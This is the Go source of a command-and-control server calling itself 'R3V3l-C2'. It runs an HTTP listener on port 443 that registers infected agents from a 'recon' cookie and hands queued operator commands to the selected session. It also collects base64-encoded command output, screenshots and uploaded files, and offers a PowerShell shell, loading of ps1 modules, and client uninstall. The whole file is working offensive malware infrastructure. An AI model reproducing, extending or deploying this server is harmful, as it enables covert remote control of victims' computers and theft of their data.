package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"github.com/AlecAivazis/survey/v2"
	"io/ioutil"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"regexp"
	"runtime"
	"strings"
	"time"

	"github.com/c-bata/go-prompt"
	"github.com/fatih/color"
	"github.com/olekukonko/tablewriter"
)

var feed = ` 

─────────────█─────────█
────────────█───────────█
───────────█──────█─────█
────────────███─█████─██
───────────────███████
██────────────█████████────────────██
─██───────────█████████───────────█
───█──────────█████████─────────██
────███────────███████────────███
──────███───────██_███──────████
─────────███──█_██████_█──████
────────────██████_███████
──────────────█████████
────██████████_████████_███████████
█████─────────████_█████─────────████
───────────────███████
────────────────█████
────────────█████████████
─────────███──█████████──███
───────███───█████_█████───██
──────██─────███████████─────██
────██───────██_█████_███───────██
───█─────────███████████────────██
───█──────────████_█████─────────█
───█───────────███████───────────█
───█────────────█████────────────█
───█─────────────███─────────────█
───█─────────────────────────────█
───█─────────────────────────────█


█▀█ █▀▀ █░█ █▀▀ █░░ ▄▄ █▀▀ ▀█
█▀▄ ██▄ ▀▄▀ ██▄ █▄▄ ░░ █▄▄ █▄
3xploit666

`

const help_shell = `
		help   Help menu
   		info   List os Info
        	load   load Moudle ps1 file
                upload upload info
		back   return Home
		exit   Uninstall client  
	 `
const help = `
     	help          Help menu                   
        set Host      Setting IP address           
        session list  List os Info                     
        Interact      Use session ID 
        shell         Shell => powershell.exe            
	exit          Exit the program                   
	 `

var (
	OS, Arch, IP, hostname, domain, username, tiempo, av string //  func info_os()  表格变量
	cmd                                                  = ""
	AGENTS                                               map[string]string
	session_id                                           = ""
	Host                                                 = ""
	back                                                 = ""
)

func del_session(id string) {
	Blue := color.New(color.FgBlue).SprintFunc()
	Red := color.New(color.FgRed).SprintFunc()
	session_id = strings.Split(id, " ")[1]
	if len(strings.Split(id, " ")) > 1 {
		delete(AGENTS, session_id)
		fmt.Printf("%s del Session id=> %s.\n", Blue("[*]"), session_id)
	} else {
		fmt.Printf("%s could not find it id  %s \n", Red("[*]"), session_id)
	}
}

func replace(web_data string) string {
	reg, _ := regexp.Compile(" ")
	data := reg.ReplaceAllString(web_data, "+")
	return data
}
func str_replace(data string, reg_str string, str string) string {
	reg, _ := regexp.Compile(reg_str)
	str_data := reg.ReplaceAllString(data, str)
	return str_data
}

func Session_id(id string) {
	Blue := color.New(color.FgBlue).SprintFunc()
	Red := color.New(color.FgRed).SprintFunc()
	if len(strings.Split(id, " ")) > 1 {
		session_id = strings.Split(id, " ")[1]
		fmt.Printf("%s setting Session id=> %s.\n", Blue("[*]"), session_id)
	} else {
		fmt.Printf("%s set Session id err \n", Red("[*]"))
	}

}

func httpServer(writer http.ResponseWriter, request *http.Request) {

	url_info, _ := regexp.Compile("/info/*")
	url_cm, _ := regexp.Compile("/cm/*")
	url_re, _ := regexp.Compile("/re/*")
	url_upload, _ := regexp.Compile("/img/*")
	url_pic, _ := regexp.Compile("/pic/*")

	if url_info.MatchString(request.URL.Path) {

		//data := mahonia.NewDecoder("gbk").ConvertString(string(request.Form.Get("data")))
		url_path, _ := regexp.Compile(`[A-Z]+`)
		id := url_path.FindString(request.URL.Path)
		//AGENTS[id] = data
		//fmt.Println(data)
		if cookie, err := request.Cookie("recon"); err == nil {
			value := cookie.Value
			color.Yellow("Cookie value Encrypted: %v", value)

			AGENTS[id] = value
			fmt.Println(value)
		}
	} else if url_cm.MatchString(request.URL.Path) {
		url_path, _ := regexp.Compile(`[A-Z]+`)
		var id = url_path.FindString(request.URL.Path)

		_, ok := AGENTS[id]
		if ok {
			if id == session_id {
				if cmd != "" {
					fmt.Fprint(writer, cmd)
					cmd = ""
					_ = request.Close
				} else {
					fmt.Fprint(writer, "")
				}
			} else {
				fmt.Fprint(writer, "")
			}
		} else {
			fmt.Fprintf(writer, "UjNWM0w=")
		}

	} else if url_re.MatchString(request.URL.Path) {
		web_data := request.PostFormValue("data")

		decoded, _ := base64.StdEncoding.DecodeString(replace(web_data))
		decodestr := string(decoded)
		color.Green(decodestr)

	} else if url_pic.MatchString(request.URL.Path) {
		web_data := request.PostFormValue("data")
		if len(web_data) > 2 {
			color.Red("image recieved [+]")
		}
		decoded, _ := base64.StdEncoding.DecodeString(replace(web_data))
		emptyfile, err := ioutil.TempFile("./FOTOS", "fotos*.png")
		if err != nil {
			fmt.Println(err)
		}
		recover()
		emptyfile.Write(decoded)
		defer emptyfile.Close()
	} else if url_upload.MatchString(request.URL.Path) {

		web_data := request.Form.Get("data")
		decoded, _ := base64.StdEncoding.DecodeString(replace(web_data))
		//decodestr := string(decoded)

		file, _ := os.Create("./upload/" + GetRandomString(5))
		file.Write(decoded)
		file.Close()
		fmt.Fprintf(writer, "ok upload")

	}
}

func info_os() {

	for k, v := range AGENTS {
		info := strings.Split(v, "#")
		OS = info[0]
		//IP = info[1]
		Arch = info[1]
		hostname = info[2]
		domain = info[3]
		username = info[4]
		tiempo = info[5]
		data := [][]string{
			{k, OS, IP, Arch, hostname, domain, username, tiempo},
		}
		table := tablewriter.NewWriter(os.Stdout)
		table.SetHeader([]string{"ID", "Whoami", "Hostname", "Avs", "Grafic", "Procesator", "Time"})

		for _, v := range data {
			table.Append(v)
		}
		table.Render() // Send output
	}

}
func GetRandomString(l int) string {
	str := "0123456789abcdefghijklmnopqrstuvwxyz"
	bytes := []byte(str)
	result := []byte{}
	r := rand.New(rand.NewSource(time.Now().UnixNano()))
	for i := 0; i < l; i++ {
		result = append(result, bytes[r.Intn(len(bytes))])
	}
	return string(result)
}

func Hosts() {

	Blue := color.New(color.FgBlue).SprintFunc()

	prompt := &survey.Input{
		Message: "set ip",
	}

	survey.AskOne(prompt, &Host, survey.WithIcons(func(icons *survey.IconSet) {

		icons.Question.Text = "メ "
		icons.Question.Format = "red+hb"

	}))
	fmt.Printf("%s setting listener => %s:9090 \n", Blue("[*]"), Host) //https://github.com/fatih/color
	fmt.Println("\n")

}

func Scanf(a *string) {
	reader := bufio.NewReader(os.Stdin)
	data, _, _ := reader.ReadLine()
	if string(data) == "info" {
		*a = ""
		info_os()
		return
	} else if string(data) == "help" {
		*a = ""

		fmt.Println(help_shell)
		return

	} else if string(data) == "back" {
		*a = ""
		back = "back"
		return
	}
	*a = string(data)

}
func clear() {
	if runtime.GOOS == "windows" {
		cmd := exec.Command("cmd", "/c", "cls")
		cmd.Stdout = os.Stdout
		cmd.Run()
		cmd.Start()
	} else {
		cmd := exec.Command("clear")
		cmd.Stdout = os.Stdout
		cmd.Run()
		cmd.Start()
	}

}
func completer(in prompt.Document) []prompt.Suggest {
	s := []prompt.Suggest{
		{Text: "help", Description: "Help menu"},
		//{Text: "set Host", Description: "Setting IP address "},
		{Text: "bot list", Description: "List os Info"},
		{Text: "use", Description: "use Boot Session "},
		{Text: "interact", Description: "bot interact >  shell"},
		{Text: "exit", Description: "Exit "},
		{Text: "del", Description: "del session id"},
	}
	return prompt.FilterHasPrefix(s, in.GetWordBeforeCursor(), true)
}
func Options() {
	for true {
		options := prompt.Input("[R3V3l-C2]>", completer,
			prompt.OptionPrefixTextColor(prompt.Green),               //色 font color
			prompt.OptionPreviewSuggestionTextColor(prompt.Black),    //  Font for drop-down menu
			prompt.OptionSelectedSuggestionBGColor(prompt.LightGray), //  Word background for drop down menu
			prompt.OptionSuggestionBGColor(prompt.Black))             // Menu box background

		if options == "interact" {
			for true {
				fmt.Print("[R3V3l-C2]> ")
				Scanf(&cmd)
				if back == "back" {
					back = ""
					break
				}

			}
		} else if options == "help" {
			fmt.Println(help)
		} else if strings.Contains(options, "use") {
			Session_id(options)
		} else if strings.Contains(options, "del") {
			del_session(options)
		} else if options == "bot list" {
			info_os()
		} else if options == "exit" {
			os.Exit(0)
			break
		} else if options == "set Host" {
			Hosts()
		}

	}

}

func main() {
	color.Blue(feed)
	AGENTS = make(map[string]string)
	http.HandleFunc("/", httpServer)

	go http.ListenAndServe(":443", nil)
	clear()
	Options()

}
